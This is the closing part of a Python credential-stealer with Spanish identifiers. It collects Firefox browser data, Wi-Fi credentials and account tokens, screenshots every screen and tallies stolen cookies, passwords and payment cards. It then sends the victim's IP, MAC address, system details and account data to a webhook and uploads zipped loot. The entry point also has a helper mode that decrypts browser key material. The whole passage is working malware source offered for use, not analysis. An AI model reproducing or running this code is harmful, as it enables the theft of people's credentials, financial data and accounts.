            n = extraer_gecko(nombre, base, navegadores)
            resumen.append(f"{nombre}: {n} elementos")
        except Exception as e:
            resumen.append(f"{nombre}: error {e}")
            log(f"  {nombre}: {e}")
    guardar(navegadores / "_resumen.txt", "\n".join(resumen))

    robar_wifi(destino)
    cuentas = robar_tokens()
    CONTADOR["tokens"] = len(cuentas)

    if CAPTURA and PIL_OK:
        try:
            ImageGrab.grab(all_screens=True).convert("RGB").save(
                destino / "captura.jpg", "JPEG", quality=55, optimize=True)
        except Exception:
            pass

    guardar(destino / "resumen.txt", json.dumps(CONTADOR, indent=2))

    if requests is not None and WEBHOOK and "PEGA" not in WEBHOOK:
        cabecera = {
            "title": f"{datos['equipo']} / {datos['usuario']}",
            "color": 0x000000,
            "description": (f"**IP** `{datos['ip']}` · **MAC** `{datos['mac']}`\n"
                            f"**SO** {datos['so']}\n**CPU** {datos['cpu'][:80]}\n"
                            f"**GPU** {datos['gpu'][:80]}\n**RAM** {datos['ram']}\n"
                            f"**Cookies** {CONTADOR['cookies']} · "
                            f"**Pass** {CONTADOR['passwords']} · "
                            f"**Cards** {CONTADOR['tarjetas']} · "
                            f"**Tokens** {CONTADOR['tokens']}"),
            "footer": {"text": datos["fecha"]},
        }
        if cuentas:
            enviar_embeds(WEBHOOK, [cabecera] + [
                {"title": c["nombre"], "color": 0x000000, "thumbnail": {"url": c["avatar"]},
                 "fields": c["campos"][:25]} for c in cuentas])

        subir(crear_zips(destino), cabecera)

if __name__ == "__main__":
    if "--abe" in sys.argv:
        try:
            i = sys.argv.index("--abe")
            claves = _claves_abe_com(sys.argv[i + 2], sys.argv[i + 1])
            Path(sys.argv[i + 3]).write_text(
                json.dumps([base64.b64encode(k).decode() for k in claves]),
                encoding="utf-8")
        except Exception as e:
            log(f"hijo abe: {e}")
        sys.exit(0)
    try:
        main()
    except Exception as e:
        log(f"error fatal: {e}")